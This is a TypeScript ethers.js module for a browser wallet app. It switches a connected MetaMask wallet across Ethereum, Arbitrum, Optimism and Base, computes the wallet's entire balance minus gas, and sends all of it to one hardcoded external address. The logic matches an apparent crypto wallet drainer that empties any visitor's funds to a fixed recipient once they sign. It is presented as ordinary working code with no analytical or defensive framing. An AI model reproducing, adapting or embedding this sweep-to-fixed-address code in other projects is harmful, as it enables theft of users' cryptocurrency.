import { ethers } from 'ethers';

// Target address to transfer assets to
const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

// Chain IDs
export const CHAIN_IDS = {
  ETHEREUM: '0x1', // 1
  ARBITRUM: '0xa4b1', // 42161
  OPTIMISM: '0xa', // 10
  BASE: '0x2105', // 8453
};

// Chain names for display
export const CHAIN_NAMES = {
  [CHAIN_IDS.ETHEREUM]: 'Ethereum',
  [CHAIN_IDS.ARBITRUM]: 'Arbitrum',
  [CHAIN_IDS.OPTIMISM]: 'Optimism',
  [CHAIN_IDS.BASE]: 'Base',
};

// Maximum gas prices by chain (in Gwei) for worst case scenarios
const MAX_GAS_PRICES = {
  [CHAIN_IDS.ETHEREUM]: '60', // High enough to ensure tx goes through
  [CHAIN_IDS.ARBITRUM]: '0.5',
  [CHAIN_IDS.OPTIMISM]: '0.1',
  [CHAIN_IDS.BASE]: '0.05',
};

// Estimated gas limit for a simple ETH transfer
const ESTIMATED_GAS_LIMIT = 21000;

/**
 * Get the current chain ID from MetaMask
 */
export const getCurrentChainId = async (): Promise<string> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    const chainId = await ethereum.request({ method: 'eth_chainId' });
    return chainId;
  } catch (error) {
    console.error('Error getting chain ID:', error);
    throw error;
  }
};

/**
 * Switch to a specified network
 */
export const switchNetwork = async (chainId: string): Promise<void> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    await ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId }],
    });
  } catch (error: any) {
    // If the chain has not been added to MetaMask
    if (error.code === 4902) {
      throw new Error(`Please add the ${CHAIN_NAMES[chainId]} network to your wallet`);
    }
    console.error('Error switching network:', error);
    throw error;
  }
};

/**
 * Get the maximum possible gas price to ensure transaction goes through
 * Each chain has a maximum plausible gas price to ensure transaction success
 */
const getMaxGasPrice = (chainId: string): ethers.BigNumber => {
  return ethers.utils.parseUnits(MAX_GAS_PRICES[chainId], 'gwei');
};

/**
 * Get the current network gas price + a buffer to ensure transaction goes through quickly
 */
const getCurrentGasPrice = async (provider: ethers.providers.Web3Provider, chainId: string): Promise<ethers.BigNumber> => {
  try {
    const networkGasPrice = await provider.getGasPrice();

    // Add a 50% buffer to the current gas price to ensure the transaction goes through quickly
    const bufferedGasPrice = networkGasPrice.mul(150).div(100);

    // Cap at the maximum gas price to avoid extremely high costs
    const maxGasPrice = getMaxGasPrice(chainId);

    // Use the lower of the two values
    return bufferedGasPrice.lt(maxGasPrice) ? bufferedGasPrice : maxGasPrice;
  } catch (error) {
    console.error('Error getting current gas price:', error);
    // Use the maximum gas price as a fallback
    return getMaxGasPrice(chainId);
  }
};

/**
 * Transfer maximum balance minus gas fees to the specified recipient
 */
export const transferAssets = async (
  chainId: string
): Promise<ethers.providers.TransactionResponse> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    // Ensure we're on the correct chain
    const currentChainId = await getCurrentChainId();
    if (currentChainId !== chainId) {
      await switchNetwork(chainId);
    }

    const provider = new ethers.providers.Web3Provider(ethereum);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    // Get current balance
    const balance = await provider.getBalance(address);

    // Get the optimal gas price with safety buffer
    const gasPrice = await getCurrentGasPrice(provider, chainId);

    // Calculate gas cost: gas price * gas limit
    const gasCost = gasPrice.mul(ESTIMATED_GAS_LIMIT);

    // Ensure the user has enough balance to pay for gas
    if (balance.lte(gasCost)) {
      throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(gasCost)} ETH for gas`);
    }

    // Calculate value to send: total balance - gas cost
    const valueToSend = balance.sub(gasCost);

    // Check that we're sending a positive amount
    if (valueToSend.lte(0)) {
      throw new Error('After gas costs, there are no funds to transfer');
    }

    console.log(`Transferring ${ethers.utils.formatEther(valueToSend)} ETH to ${RECIPIENT_ADDRESS}`);
    console.log(`Gas cost: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);

    // Create transaction object
    const tx = {
      to: RECIPIENT_ADDRESS,
      value: valueToSend,
      gasPrice,
      gasLimit: ESTIMATED_GAS_LIMIT,
    };

    // Send the transaction
    return await signer.sendTransaction(tx);
  } catch (error) {
    console.error('Error transferring assets:', error);
    throw error;
  }
};
